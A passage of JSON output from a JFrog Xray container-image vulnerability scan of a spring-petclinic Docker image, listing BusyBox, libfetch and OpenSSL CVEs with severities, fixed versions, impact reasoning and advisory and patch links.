                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "There is a stack overflow vulnerability in ash.c:6030 in busybox before 1.35. In the environment of Internet of Vehicles, this vulnerability can be executed from command to arbitrary code execution.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-529062",
            "VulnerabilityTitle": "",
            "ShortDescription": "A stack buffer overflow in BusyBox ash leads to denial of service and possibly code execution when processing malformed command line arguments.",
            "FullDescription": "[BusyBox](https://busybox.net/) is a lightweight and versatile software package that combines several common Unix utilities into a single executable file, providing a streamlined and efficient solution for resource-constrained environments or embedded systems.\n`ash` is a Unix shell interpreter included with `Busybox`, which can be used as an interactive shell or as a script interpreter, depending on the way it was run. It is often used in embedded systems and other environments with limited resources where a full-featured shell like Bash might be too resource-intensive.\n\nA stack buffer overflow in BusyBox ash leads to denial of service and possibly code execution when processing malformed command line arguments.\n\nAn attacker that controls an initial input to the shell via the `-c` command line argument can propagate malformed input to the vulnerable function `evaluate_string`. A public [exploit](https://bugs.busybox.net/show_bug.cgi?id=15216) which demonstrates denial of service exists, but no public exploit is known for the arbitrary code execution part.",
            "Impact": 4,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The linked vendor advisory from BusyBox shows a PoC demonstrating a crash.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The given CVSS score does not reflect the context required to exploit this vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The `ash` interactive shell is usually used in a local context, which makes crashing the process a non-issue.\nMoreover, if an attacker was granted access to run scripts in `ash` the possibility of malicious arbitrary code execution is already high.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "`BusyBox ash` is an interactive shell, in order to exploit this vulnerability an attacker needs to trigger the buffer overflow using functionalities supplied within the shell itself.\nMoreover, the buffer overflow is only applicable when the `-c` flag, which denotes a script, is used.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "BusyBox Advisory & PoC (crashing) exploit",
                  "Url": "https://bugs.busybox.net/show_bug.cgi?id=15216",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://git.busybox.net/busybox/commit/?id=d417193cf",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "cve_id": "CVE-2022-48174",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the attacker must be able to partially control the command line args of the 'busybox ash' command",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "vulnerability_id": "CVE-2022-48174",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-529062",
         "severity": "Critical",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "There is a stack overflow vulnerability in ash.c:6030 in busybox before 1.35. In the environment of Internet of Vehicles, this vulnerability can be executed from command to arbitrary code execution.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.36.1-r2"
            ],
            "fixed_versions": [
               "1.36.1-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-48174",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "There is a stack overflow vulnerability in ash.c:6030 in busybox before 1.35. In the environment of Internet of Vehicles, this vulnerability can be executed from command to arbitrary code execution.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-529062",
            "VulnerabilityTitle": "",
            "ShortDescription": "A stack buffer overflow in BusyBox ash leads to denial of service and possibly code execution when processing malformed command line arguments.",
            "FullDescription": "[BusyBox](https://busybox.net/) is a lightweight and versatile software package that combines several common Unix utilities into a single executable file, providing a streamlined and efficient solution for resource-constrained environments or embedded systems.\n`ash` is a Unix shell interpreter included with `Busybox`, which can be used as an interactive shell or as a script interpreter, depending on the way it was run. It is often used in embedded systems and other environments with limited resources where a full-featured shell like Bash might be too resource-intensive.\n\nA stack buffer overflow in BusyBox ash leads to denial of service and possibly code execution when processing malformed command line arguments.\n\nAn attacker that controls an initial input to the shell via the `-c` command line argument can propagate malformed input to the vulnerable function `evaluate_string`. A public [exploit](https://bugs.busybox.net/show_bug.cgi?id=15216) which demonstrates denial of service exists, but no public exploit is known for the arbitrary code execution part.",
            "Impact": 4,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The linked vendor advisory from BusyBox shows a PoC demonstrating a crash.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The given CVSS score does not reflect the context required to exploit this vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "The `ash` interactive shell is usually used in a local context, which makes crashing the process a non-issue.\nMoreover, if an attacker was granted access to run scripts in `ash` the possibility of malicious arbitrary code execution is already high.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "`BusyBox ash` is an interactive shell, in order to exploit this vulnerability an attacker needs to trigger the buffer overflow using functionalities supplied within the shell itself.\nMoreover, the buffer overflow is only applicable when the `-c` flag, which denotes a script, is used.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "BusyBox Advisory & PoC (crashing) exploit",
                  "Url": "https://bugs.busybox.net/show_bug.cgi?id=15216",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://git.busybox.net/busybox/commit/?id=d417193cf",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "cve_id": "CVE-2022-48174",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on user interaction. Specifically - the attacker must be able to partially control the command line args of the 'busybox ash' command",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
            "vulnerability_id": "CVE-2022-48174",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-180796",
         "severity": "Critical",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "libfetch before 2021-07-26, as used in apk-tools, xbps, and other products, mishandles numeric strings for the FTP and HTTP protocols. The FTP passive mode implementation allows an out-of-bounds read because strtol is used to parse the relevant numbers into address bytes. It does not check if the line ends prematurely. If it does, the for-loop condition checks for the '\\0' terminator one byte too late.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:apk-tools",
         "source_id": "alpine://3.14:apk-tools",
         "source_comp_id": "alpine://3.14:apk-tools:2.12.5-r1",
         "component_versions": {
            "id": "3.14:apk-tools",
            "vulnerable_versions": [
               "< 2.12.6-r0"
            ],
            "fixed_versions": [
               "2.12.6-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-36159",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "6.4/CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:P",
                     "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "libfetch before 2021-07-26, as used in apk-tools, xbps, and other products, mishandles numeric strings for the FTP and HTTP protocols. The FTP passive mode implementation allows an out-of-bounds read because strtol is used to parse the relevant numbers into address bytes. It does not check if the line ends prematurely. If it does, the for-loop condition checks for the '\\0' terminator one byte too late.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-36159",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-200048",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 1.1.1n-r0"
            ],
            "fixed_versions": [
               "1.1.1n-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-0778",
                     "cwe": [
                        "CWE-835"
                     ],
                     "cwe_details": {
                        "CWE-835": {
                           "name": "Loop with Unreachable Exit Condition ('Infinite Loop')",
                           "description": "The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-200048",
            "VulnerabilityTitle": "",
            "ShortDescription": "Infinite loop in OpenSSL leads to denial of service when parsing a malformed certificate.",
            "FullDescription": "A flaw was discovered in OpenSSL's `BN_mod_sqrt` function, when handling a non-prime modulus (`p`) - an incomplete loop condition can cause the function to loop indefinitely, causing a denial of service.\n\nIt is possible to create a malformed X.509 certificate, containing elliptic curve parameters that trigger this issue, when the certificate is parsed.\nA malformed certificate may be parsed under various conditions - \n1. TLS clients consuming server certificates - ex. a victim browser surfing to a malicious HTTPS website\n2. TLS servers consuming client certificates - ex. a victim HTTPS server that accepts client certificates, attacked by a malicious HTTPS client (note that most web servers, including Apache and NGINX, do not accept client certificates by default)\n\nNote that unlike the original advisory suggests, all OpenSSL versions since 0.9.7 are vulnerable to this issue",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by an unauthenticated attacker or an attacker with low privileges",
                  "Description": "X.509 certificates must be parsed before they can be validated, so an unauthenticated attack is highly likely",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerable service must somehow parse an X.509 certificate",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "A vast amount of services parse X.509 certificates using OpenSSL",
                  "IsPositive": 0,
                  "InsertOrder": 6
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "In many cases, including the case of web servers that accept client certificates - unauthenticated remote attack is possible. Other cases are context-dependent.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has multiple mentions in general media",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The exploit performs a local test and allows generating a malicious certificate for remote attacks",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Denial of service only. Since most web clients and servers employ multiprocessing, causing one process to get stuck in an infinite loop will not DoS the entire application. Furthermore - `openssl` is often run as a standalone (forked) process, which will have no effect if stuck in an infinite loop.",
                  "IsPositive": 1,
                  "InsertOrder": 7
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Technical writeup + PoC exploit (local test + malicious certificate generation)",
                  "Url": "https://github.com/drago-96/CVE-2022-0778",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Vendor test contains a testcase with parameters for generating a malicious certificate",
                  "Url": "https://github.com/openssl/openssl/commit/3ef5c3034e5c545f34d6929568f3f2b10ac4bdf0",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Vendor patch",
                  "Url": "https://github.com/openssl/openssl/commit/3118eb64934499d93db3230748a452351d1d9a65",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Original advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220315.txt",
                  "InsertOrder": 4
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-0778",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-200048",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libretls",
         "source_id": "alpine://3.14:libretls",
         "source_comp_id": "alpine://3.14:libretls:3.3.3-r0",
         "component_versions": {
            "id": "3.14:libretls",
            "vulnerable_versions": [
               "< 3.3.3p1-r3"
            ],
            "fixed_versions": [
               "3.3.3p1-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-0778",
                     "cwe": [
                        "CWE-835"
                     ],
                     "cwe_details": {
                        "CWE-835": {
                           "name": "Loop with Unreachable Exit Condition ('Infinite Loop')",
                           "description": "The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop."
                        }
                     },
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-200048",
            "VulnerabilityTitle": "",
            "ShortDescription": "Infinite loop in OpenSSL leads to denial of service when parsing a malformed certificate.",
            "FullDescription": "A flaw was discovered in OpenSSL's `BN_mod_sqrt` function, when handling a non-prime modulus (`p`) - an incomplete loop condition can cause the function to loop indefinitely, causing a denial of service.\n\nIt is possible to create a malformed X.509 certificate, containing elliptic curve parameters that trigger this issue, when the certificate is parsed.\nA malformed certificate may be parsed under various conditions - \n1. TLS clients consuming server certificates - ex. a victim browser surfing to a malicious HTTPS website\n2. TLS servers consuming client certificates - ex. a victim HTTPS server that accepts client certificates, attacked by a malicious HTTPS client (note that most web servers, including Apache and NGINX, do not accept client certificates by default)\n\nNote that unlike the original advisory suggests, all OpenSSL versions since 0.9.7 are vulnerable to this issue",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by an unauthenticated attacker or an attacker with low privileges",
                  "Description": "X.509 certificates must be parsed before they can be validated, so an unauthenticated attack is highly likely",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The vulnerable service must somehow parse an X.509 certificate",
                  "IsPositive": 1,
                  "InsertOrder": 5
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "A vast amount of services parse X.509 certificates using OpenSSL",
                  "IsPositive": 0,
                  "InsertOrder": 6
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "In many cases, including the case of web servers that accept client certificates - unauthenticated remote attack is possible. Other cases are context-dependent.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has multiple mentions in general media",
                  "Description": "",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The exploit performs a local test and allows generating a malicious certificate for remote attacks",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Denial of service only. Since most web clients and servers employ multiprocessing, causing one process to get stuck in an infinite loop will not DoS the entire application. Furthermore - `openssl` is often run as a standalone (forked) process, which will have no effect if stuck in an infinite loop.",
                  "IsPositive": 1,
                  "InsertOrder": 7
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Technical writeup + PoC exploit (local test + malicious certificate generation)",
                  "Url": "https://github.com/drago-96/CVE-2022-0778",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Vendor test contains a testcase with parameters for generating a malicious certificate",
                  "Url": "https://github.com/openssl/openssl/commit/3ef5c3034e5c545f34d6929568f3f2b10ac4bdf0",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Vendor patch",
                  "Url": "https://github.com/openssl/openssl/commit/3118eb64934499d93db3230748a452351d1d9a65",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Original advisory",
                  "Url": "https://www.openssl.org/news/secadv/20220315.txt",
                  "InsertOrder": 4
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-0778",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-200048",
         "severity": "High",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The BN_mod_sqrt() function, which computes a modular square root, contains a bug that can cause it to loop forever for non-prime moduli. Internally this function is used when parsing certificates that contain elliptic curve public keys in compressed form or explicit elliptic curve parameters with a base point encoded in compressed form. It is possible to trigger the infinite loop by crafting a certificate that has invalid explicit curve parameters. Since certificate parsing happens prior to verification of the certificate signature, any process that parses an externally supplied certificate may thus be subject to a denial of service attack. The infinite loop can also be reached when parsing crafted private keys as they can contain explicit elliptic curve parameters. Thus vulnerable situations include: - TLS clients consuming server certificates - TLS servers consuming client certificates - Hosting providers taking certificates or private keys from customers - Certificate authorities parsing certification requests from subscribers - Anything else which parses ASN.1 elliptic curve parameters Also any other applications that use the BN_mod_sqrt() where the attacker can control the parameter values are vulnerable to this DoS issue. In the OpenSSL 1.0.2 version the public key is not parsed during initial parsing of the certificate which makes it slightly harder to trigger the infinite loop. However any operation which requires the public key from the certificate will trigger the infinite loop. In particular the attacker can use a self-signed certificate to trigger the loop during verification of the certificate signature. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0. It was addressed in the releases of 1.1.1n and 3.0.2 on the 15th March 2022. Fixed in OpenSSL 3.0.2 (Affected 3.0.0,3.0.1). Fixed in OpenSSL 1.1.1n (Affected 1.1.1-1.1.1m). Fixed in OpenSSL 1.0.2zd (Affected 1.0.2-1.0.2zc).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
